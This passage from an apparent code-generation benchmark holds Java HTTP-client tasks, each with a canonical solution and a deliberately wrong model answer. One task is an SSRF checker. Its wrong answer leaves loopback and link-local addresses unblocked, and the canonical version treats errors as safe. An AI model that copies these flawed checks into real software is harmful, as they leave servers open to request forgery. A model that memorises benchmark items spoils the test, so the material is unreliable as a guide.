param : params.entrySet()) {\n                        builder.appendQueryParameter(param.getKey(), param.getValue().toString());\n                    }\n                    String query = builder.build().getEncodedQuery();\n                    if (shouldGzipRequestPayload) {\n                        connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n                    } else {\n                        connection.setFixedLengthStreamingMode(query.getBytes().length);\n                    }\n                    connection.setDoOutput(true);\n                    connection.setRequestMethod(\"POST\");\n                    out = connection.getOutputStream();\n                    bout = getBufferedOutputStream(out);\n                    bout.write(query.getBytes(\"UTF-8\"));\n                    bout.flush();\n                    bout.close();\n                    bout = null;\n                    out.close();\n                    out = null;\n                }\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    interactor.onProxyResponse(endpointUrl, connection.getResponseCode());\n                }\n                in = connection.getInputStream();\n                response = slurp(in);\n                in.close();\n                in = null;\n                succeeded = true;\n            } catch (final EOFException e) {\n                MPLog.d(LOGTAG, \"Failure to connect, likely caused by a known issue with Android lib. Retrying.\");\n                retries = retries + 1;\n            } catch (final IOException e) {\n                if (connection != null && connection.getResponseCode() >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && connection.getResponseCode() <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Service Unavailable\", connection.getHeaderField(\"Retry-After\"));\n                } else {\n                    throw e;\n                }\n            }\n            finally {\n                if (null != bout)\n                    try { bout.close(); } catch (final IOException e) {}\n                if (null != out)\n                    try { out.close(); } catch (final IOException e) {}\n                if (null != in)\n                    try { in.close(); } catch (final IOException e) {}\n                if (null != connection)\n                    connection.disconnect();\n            }\n        }\n        if (retries >= 3) {\n            MPLog.v(LOGTAG, \"Could not connect to Mixpanel service after three retries.\");\n        }\n        return response;\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if(shouldGzipRequestPayload) {\n          return new GZIPOutputStream(new BufferedOutputStream(out), HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out);\n        }\n    }\n\n    private static boolean isProxyRequest(String endpointUrl) {\n        return !endpointUrl.toLowerCase().contains(MIXPANEL_API.toLowerCase());\n    }\n\n    private static byte[] slurp(final InputStream inputStream) throws IOException {\n        final ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[8192];\n\n        while ((nRead = inputStream.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class HttpService {\n    private boolean shouldGzipRequestPayload;\n    private static final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = 500;\n    private static final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private static final String LOGTAG = \"HttpService\";\n    private static final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private static final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private static final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws IOException {\n        if (isProxyRequest(endpointUrl)) {\n            Proxy proxy = getProxyFromInteractor(interactor);\n            if (proxy != null) {\n                URL url = new URL(endpointUrl);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setInstanceFollowRedirects(false);\n                connection.setProxy(proxy);\n                connection.setDoOutput(true);\n                connection.setDoInput(true);\n                connection.setRequestMethod(\"POST\");\n\n                // Set SSL socket factory if provided\n                if (socketFactory != null) {\n                    // In practice, this would require a custom HTTP client\n                    // For this example, we'll skip setting the SSL socket factory\n                }\n\n                // Set headers\n                if (shouldGzipRequestPayload) {\n                    connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n                }\n\n                // Prepare request body\n                OutputStream outputStream = getBufferedOutputStream(connection.getOutputStream());\n                if (params != null) {\n                    String requestBody = encodeParams(params);\n                    outputStream.write(requestBody.getBytes(StandardCharsets.UTF_8));\n                }\n                outputStream.close();\n\n                // Handle response\n                int responseCode = connection.getResponseCode();\n                if (responseCode >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && responseCode <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Server returned \" + responseCode + \" status code\");\n                }\n\n                return slurp(connection.getInputStream());\n            }\n        }\n\n        // Default non-proxy request\n        URL url = new URL(endpointUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setInstanceFollowRedirects(false);\n        connection.setDoOutput(true);\n        connection.setDoInput(true);\n        connection.setRequestMethod(\"POST\");\n\n        // Set SSL socket factory if provided\n        if (socketFactory != null) {\n            // In practice, this would require a custom HTTP client\n            // For this example, we'll skip setting the SSL socket factory\n        }\n\n        // Set headers\n        if (shouldGzipRequestPayload) {\n            connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n        }\n\n        // Prepare request body\n        OutputStream outputStream = getBufferedOutputStream(connection.getOutputStream());\n        if (params != null) {\n            String requestBody = encodeParams(params);\n            outputStream.write(requestBody.getBytes(StandardCharsets.UTF_8));\n        }\n        outputStream.close();\n\n        // Handle response\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && responseCode <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n            throw new ServiceUnavailableException(\"Server returned \" + responseCode + \" status code\");\n        }\n\n        return slurp(connection.getInputStream());\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) {\n        if (shouldGzipRequestPayload) {\n            return new GZIPOutputStream(new BufferedOutputStream(out, HTTP_OUTPUT_STREAM_BUFFER_SIZE));\n        } else {\n            return new BufferedOutputStream(out, HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        }\n    }\n\n    public boolean isProxyRequest(String endpointUrl) {\n        return endpointUrl.contains(\"proxy\");\n    }\n\n    private byte[] slurp(InputStream inputStream) throws IOException {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        byte[] buffer = new byte[HTTP_OUTPUT_STREAM_BUFFER_SIZE];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            byteArrayOutputStream.write(buffer, 0, bytesRead);\n        }\n        return byteArrayOutputStream.toByteArray();\n    }\n\n    private String encodeParams(Map<String, Object> params) {\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : params.entrySet()) {\n            sb.append(URLEncoder.encode(entry.getKey(), StandardCharsets.UTF_8)).append(\"=\")\n              .append(URLEncoder.encode(entry.getValue().toString(), StandardCharsets.UTF_8)).append(\"&\");\n        }\n        return sb.substring(0, sb.length() - 1);\n    }\n\n    private Proxy getProxyFromInteractor(ProxyServerInteractor interactor) {\n        // Placeholder implementation; actual logic depends on ProxyServerInteractor\n        return new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080));\n    }\n}\n```"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Java class that checks the HTTP status of a given URL and provides information about the response code and any redirection.\n\nClass Description: The HttpStatusChecker class is responsible for making HTTP requests to a specified URL, checking the response status code, and providing information about the response. It handles redirections and provides human-readable messages for the status codes. The class is designed for Android applications, using Android-specific components for logging and resource management.\n\nAttributes:\n- context: Context - The Android context used for accessing resources and system services.\n- url: String - The URL to be checked for HTTP status.\n\nMethods:\n- checkStatus() -> StatusResult - Performs the HTTP request to the specified URL, checks the response code, handles redirections, and returns a StatusResult object containing the status message and redirection URL (if any). This method handles various exceptions and provides appropriate error messages.\n  \n  Nested Class:\n  - StatusResult - A static inner class that holds the result of the HTTP status check.\n    Attributes:\n    - message: String - A human-readable message describing the HTTP status or error.\n    - redirectionUrl: String - The URL to which the original URL redirects (null if no redirection).",
    "Canonical_solution": "import android.content.Context;\nimport android.util.Log;\n\nimport com.trianguloy.urlchecker.utilities.methods.HttpUtils;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpStatusChecker {\n\n    private final Context context;\n    private final String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        String message = null;\n        String redirectionUrl = null;\n\n        HttpURLConnection conn = null;\n        try {\n            // Step 2: Get the access URL\n            Log.d(\"STATUS\", \"Checking: \" + url);\n            \n            // Step 3: Create an HttpURLConnection object\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            \n            // Step 4: Set request parameters\n            conn.setInstanceFollowRedirects(false);\n            conn.setConnectTimeout(HttpUtils.CONNECT_TIMEOUT);\n            \n            // Step 5: Processing Input and Output\n            var responseCode = conn.getResponseCode();\n            Log.d(\"RESPONSE_CODE\", url + \": \" + responseCode);\n\n            var codesArray = context.getResources().getStringArray(R.array.mStatus_codes);\n            for (var s : codesArray) {\n                if (s.startsWith(String.valueOf(responseCode))) {\n                    message = s;\n                    break;\n                }\n            }\n            if (message == null) {\n                message = context.getString(R.string.mStatus_unknownCode, responseCode);\n            }\n\n            var location = conn.getHeaderField(\"Location\");\n            if (location != null) {\n                redirectionUrl = new URL(new URL(url), location).toExternalForm();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_ioerror, e.getMessage());\n        } catch (Exception e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_error, e.getMessage());\n        } finally {\n            // Step 6: Disconnect\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n\n        return new StatusResult(message, redirectionUrl);\n    }\n\n    public static class StatusResult {\n        public final String message;\n        public final String redirectionUrl;\n\n        public StatusResult(String message, String redirectionUrl) {\n            this.message = message;\n            this.redirectionUrl = redirectionUrl;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpStatusChecker {\n    private Context context;\n    private String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        try {\n            URL currentUrl = new URL(url);\n            HttpURLConnection connection = (HttpURLConnection) currentUrl.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            int responseCode = connection.getResponseCode();\n            String responseMessage = connection.getResponseMessage();\n            String redirectUrl = null;\n\n            while (responseCode >= 300 && responseCode < 400) {\n                String location = connection.getHeaderField(\"Location\");\n                if (location == null || location.isEmpty()) {\n                    break;\n                }\n                redirectUrl = location;\n                currentUrl = new URL(redirectUrl);\n                connection = (HttpURLConnection) currentUrl.openConnection();\n                connection.setRequestMethod(\"GET\");\n                responseCode = connection.getResponseCode();\n                responseMessage = connection.getResponseMessage();\n            }\n\n            String message = getHttpStatusMessage(responseCode);\n            return new StatusResult(message, redirectUrl);\n        } catch (Exception e) {\n            Log.e(\"HttpStatusChecker\", \"Error checking status\", e);\n            return new StatusResult(context.getString(R.string.error_checking_status), null);\n        }\n    }\n\n    private String getHttpStatusMessage(int code) {\n        switch (code) {\n            case 200: return \"OK\";\n            case 404: return \"Not Found\";\n            case 401: return \"Unauthorized\";\n            case 403: return \"Forbidden\";\n            case 500: return \"Internal Server Error\";\n            default: return \"Unknown Status Code: \" + code;\n        }\n    }\n\n    static class StatusResult {\n        String message;\n        String redirectionUrl;\n\n        public StatusResult(String message, String redirectionUrl) {\n            this.message = message;\n            this.redirectionUrl = redirectionUrl;\n        }\n    }\n}"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using HttpURLConnection, supporting both GET and POST methods asynchronously, with callback mechanisms for handling responses and errors. The class should also include functionality to retrieve network time from a server.\n\nClass Description: HttpURLConnectionUtils is a utility class that provides asynchronous HTTP request capabilities using Java's HttpURLConnection. It supports GET and POST methods, allows setting custom headers, and provides callback interfaces for handling responses and errors. Additionally, it includes functionality to fetch network time from a specified URL.\n\nAttributes:\n- TAG: String - Class tag for logging purposes\n- TIMEOUT_IN_MILLIONS: int - Default timeout for connections in milliseconds (5000ms)\n- BAIDU_URL: String - Default URL for network time requests (https://www.baidu.com)\n\nMethods:\n- doGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous GET request to the specified URL and invokes the callback with the response or error\n- doPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous POST request to the specified URL with given parameters and invokes the callback\n- getNetTime(TimeCallback callback) -> void - Retrieves network time from the default BAIDU_URL using the provided callback\n- getNetTime(String urlStr, TimeCallback callback) -> void - Retrieves network time from the specified URL using the provided callback\n- request(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic\n- reqNetTime(String urlStr, TimeCallback callback) -> void - Internal method that handles network time retrieval\n\nCallback Interfaces:\n- Callback: \n  - onResponse(String result, long response) -> void - Called when request succeeds\n  - onFail(Throwable error) -> void - Called when request fails\n- TimeCallback:\n  - onResponse(long millis) -> void - Called when network time retrieval succeeds\n  - onFail(Throwable error) -> void - Called when network time retrieval fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final String TAG = HttpURLConnectionUtils.class.getSimpleName();\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n    public static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(final String urlStr, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(final String urlStr, final String params, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void getNetTime(final TimeCallback callback) {\n        getNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(final String urlStr, final TimeCallback callback) {\n        new Thread(() -> reqNetTime(urlStr, callback)).start();\n    }\n\n    private static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            \n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n            \n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n            \n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1)) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n\n    private static void reqNetTime(final String urlStr, final TimeCallback callback) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            long date = connection.getDate();\n            if (date <= 0) {\n                date = -1L;\n            }\n            if (callback != null) {\n                callback.onResponse(date);\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpURLConnectionUtils {\n    private static final String TAG = \"HttpURLConnectionUtils\";\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n    private static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public void doGetAsync(String urlStr, Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    public void doPostAsync(String urlStr, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    public void getNetTime(TimeCallback callback) {\n        reqNetTime(BAIDU_URL, callback);\n    }\n\n    public void getNetTime(String urlStr, TimeCallback callback) {\n        reqNetTime(urlStr, callback);\n    }\n\n    private void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) throws Exception {\n        URL url = new URL(urlStr);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n        connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                connection.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n\n        if (\"POST\".equals(method)) {\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            try (OutputStream os = connection.getOutputStream()) {\n                if (params != null) {\n                    os.write(params.getBytes(StandardCharsets.UTF_8));\n                }\n            }\n        } else {\n            connection.setRequestMethod(\"GET\");\n            if (params != null && !params.isEmpty()) {\n                String query = URLEncoder.encode(params, StandardCharsets.UTF_8.toString());\n                URL newUrl = new URL(urlStr + \"?\" + query);\n                connection = (HttpURLConnection) newUrl.openConnection();\n                connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        connection.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n                connection.setRequestMethod(\"GET\");\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        String responseMessage = connection.getResponseMessage();\n\n        try (InputStream inputStream = connection.getInputStream()) {\n            byte[] buffer = new byte[1024];\n            StringBuilder result = new StringBuilder();\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                result.append(new String(buffer, 0, bytesRead));\n            }\n            callback.onResponse(result.toString(), responseCode);\n        } catch (IOException e) {\n            callback.onFail(e);\n        }\n    }\n\n    private void reqNetTime(String urlStr, TimeCallback callback) {\n        new Thread(() -> {\n            try {\n                HttpURLConnection connection = (HttpURLConnection) new URL(urlStr).openConnection();\n                connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n                connection.setRequestMethod(\"GET\");\n\n                int responseCode = connection.getResponseCode();\n                String responseMessage = connection.getResponseMessage();\n\n                try (InputStream inputStream = connection.getInputStream()) {\n                    byte[] buffer = new byte[1024];\n                    StringBuilder result = new StringBuilder();\n                    int bytesRead;\n                    while ((bytesRead = inputStream.read(buffer)) != -1) {\n                        result.append(new String(buffer, 0, bytesRead));\n                    }\n                    long millis = Long.parseLong(result.toString());\n                    callback.onResponse(millis);\n                } catch (IOException e) {\n                    callback.onFail(e);\n                }\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n}"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Implement a Java class for SSRF (Server-Side Request Forgery) security checks that validates URLs to prevent internal network access.\n\nClass Description: The SSRFChecker class provides functionality to check if a given URL is safe by verifying it doesn't resolve to internal IP addresses. It includes methods for URL validation, host extraction, IP resolution, and internal IP detection.\n\nAttributes:\n- logger: Logger - Used for logging error and info messages\n- decimalIp: String - Stores converted IP address in decimal format\n\nMethods:\n- checkSSRF(String url, int checkTimes) -> boolean - Main method to validate URL against SSRF risks. Follows redirects up to checkTimes. Returns true if safe, false if dangerous.\n- isInternalIpByUrl(String url) -> boolean - Checks if URL's host resolves to an internal IP. Returns true if internal/dangerous.\n- isInternalIp(String strIP) -> boolean - Verifies if given IP is in blocked subnets. Returns true if IP is internal.\n- host2ip(String host) -> String - Resolves hostname to IP address. Returns empty string on failure.\n- url2host(String url) -> String - Extracts host from URL. Returns empty string for non-HTTP URLs or invalid URLs.\n- isOctalIP(String host) -> boolean - (Private) Checks if host is in octal IP format. Returns true if octal format detected.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.InetAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\n\nimport org.apache.commons.lang.StringUtils;\nimport org.apache.commons.net.util.SubnetUtils;\nimport org.joychou.config.WebConfig;\nimport org.joychou.security.SecurityUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class SSRFChecker {\n\n    private static final Logger logger = LoggerFactory.getLogger(SSRFChecker.class);\n    private static String decimalIp;\n\n    public static boolean checkSSRF(String url, int checkTimes) {\n        HttpURLConnection connection;\n        int connectTime = 5 * 1000;\n        int i = 1;\n        String finalUrl = url;\n        try {\n            do {\n                if (isInternalIpByUrl(finalUrl)) {\n                    logger.error(\"[-] SSRF check failed. Dangerous url: \" + finalUrl);\n                    return false;\n                }\n\n                connection = (HttpURLConnection) new URL(finalUrl).openConnection();\n                connection.setInstanceFollowRedirects(false);\n                connection.setUseCaches(false);\n                connection.setConnectTimeout(connectTime);\n                connection.connect();\n                int responseCode = connection.getResponseCode();\n                if (responseCode >= 300 && responseCode <= 307 && responseCode != 304 && responseCode != 306) {\n                    String redirectedUrl = connection.getHeaderField(\"Location\");\n                    if (null == redirectedUrl)\n                        break;\n                    finalUrl = redirectedUrl;\n                    i += 1;\n                    logger.info(\"redirected url: \" + finalUrl);\n                    if (i == checkTimes) {\n                        return false;\n                    }\n                } else\n                    break;\n            } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);\n            connection.disconnect();\n        } catch (Exception e) {\n            return true;\n        }\n        return true;\n    }\n\n    public static boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.equals(\"\")) {\n            return true;\n        }\n\n        String ip = host2ip(host);\n        if (ip.equals(\"\")) {\n            return true;\n        }\n\n        return isInternalIp(ip);\n    }\n\n    public static boolean isInternalIp(String strIP) {\n        if (StringUtils.isEmpty(strIP)) {\n            logger.error(\"[-] SSRF check failed. IP is empty. \" + strIP);\n            return true;\n        }\n\n        ArrayList<String> blackSubnets = WebConfig.getSsrfBlockIps();\n        for (String subnet : blackSubnets) {\n            SubnetUtils utils = new SubnetUtils(subnet);\n            if (utils.getInfo().isInRange(strIP)) {\n                logger.error(\"[-] SSRF check failed. Internal IP: \" + strIP);\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    public static String host2ip(String host) {\n        if (null == host) {\n            return \"\";\n        }\n\n        if(isOctalIP(host)) {\n            host = decimalIp;\n        }\n\n        try {\n            InetAddress IpAddress = InetAddress.getByName(host);\n            return IpAddress.getHostAddress();\n        } catch (Exception e) {\n            logger.error(\"host2ip exception \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    private static String url2host(String url) {\n        try {\n            URI u = new URI(url);\n            if (SecurityUtil.isHttp(url)) {\n                return u.getHost();\n            }\n            return \"\";\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.*;\nimport java.util.logging.*;\n\npublic class SSRFChecker {\n    private Logger logger;\n    private String decimalIp;\n\n    public SSRFChecker() {\n        this.logger = Logger.getLogger(SSRFChecker.class.getName());\n    }\n\n    public boolean checkSSRF(String url, int checkTimes) {\n        String currentUrl = url;\n        for (int i = 0; i < checkTimes; i++) {\n            String host = url2host(currentUrl);\n            if (host.isEmpty()) {\n                logger.warning(\"Invalid URL: \" + currentUrl);\n                return false;\n            }\n            String ip = host2ip(host);\n            if (!ip.isEmpty() && isInternalIp(ip)) {\n                logger.severe(\"Internal IP detected: \" + ip);\n                return false;\n            }\n            try {\n                URL u = new URL(currentUrl);\n                HttpURLConnection conn = (HttpURLConnection) u.openConnection();\n                conn.setConnectTimeout(5000);\n                conn.setReadTimeout(5000);\n                conn.setRequestMethod(\"HEAD\");\n                int responseCode = conn.getResponseCode();\n                if (responseCode >= 300 && responseCode < 400) {\n                    String location = conn.getHeaderField(\"Location\");\n                    if (location != null) {\n                        currentUrl = location;\n                        logger.fine(\"Redirected to: \" + currentUrl);\n                    }\n                }\n            } catch (Exception e) {\n                logger.severe(\"Error during redirect check: \" + e.getMessage());\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.isEmpty()) return false;\n        String ip = host2ip(host);\n        return !ip.isEmpty() && isInternalIp(ip);\n    }\n\n    public boolean isInternalIp(String strIP) {\n        String[] parts = strIP.split(\"\\\\.\");\n        if (parts.length != 4) return false;\n        try {\n            int a = Integer.parseInt(parts[0]);\n            int b = Integer.parseInt(parts[1]);\n            int c = Integer.parseInt(parts[2]);\n            int d = Integer.parseInt(parts[3]);\n            if (a == 10) return true;\n            if (a == 172 && b >= 16 && b <= 31) return true;\n            if (a == 192 && b == 168) return true;\n            return false;\n        } catch (NumberFormatException e) {\n            return false;\n        }\n    }\n\n    public String host2ip(String host) {\n        try {\n            InetAddress inet = InetAddress.getByName(host);\n            String ip = inet.getHostAddress();\n            this.decimalIp = Integer.toString(ipToDecimal(ip));\n            return ip;\n        } catch (Exception e) {\n            logger.severe(\"Failed to resolve IP for host: \" + host + \" - \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    private int ipToDecimal(String ip) {\n        String[] parts = ip.split(\"\\\\.\");\n        if (parts.length != 4) return 0;\n        try {\n            int a = Integer.parseInt(parts[0]);\n            int b = Integer.parseInt(parts[1]);\n            int c = Integer.parseInt(parts[2]);\n            int d = Integer.parseInt(parts[3]);\n            return (a << 24) | (b << 16) | (c << 8) | d;\n        } catch (NumberFormatException e) {\n            return 0;\n        }\n    }\n\n    public String url2host(String url) {\n        try {\n            URL u = new URL(url);\n            String host = u.getHost();\n            int port = u.getPort();\n            if (port != -1) {\n                return host + \":\" + port;\n            } else {\n                return host;\n            }\n        } catch (Exception e) {\n            logger.severe(\"Invalid URL: \" + url + \" - \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    private boolean isOctalIP(String host) {\n        String[] parts = host.split(\"\\\\.\");\n        if (parts.length != 4) return false;\n        for (String part : parts) {\n            if (part.length() == 0) return false;\n            if (part.charAt(0) != '0') return false;\n            for (char c : part.toCharArray()) {\n                if (c < '0' || c > '7') return false;\n            }\n        }\n        return true;\n    }\n}"
  },
  {
    "Task_id": 92,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response stream, and return the content as a UTF-8 encoded string. It should handle resource cleanup properly by closing all streams and disconnecting the HTTP connection.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent\n\nOutput: \n- String - The response content from the HTTP GET request, or null if an error occurs",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        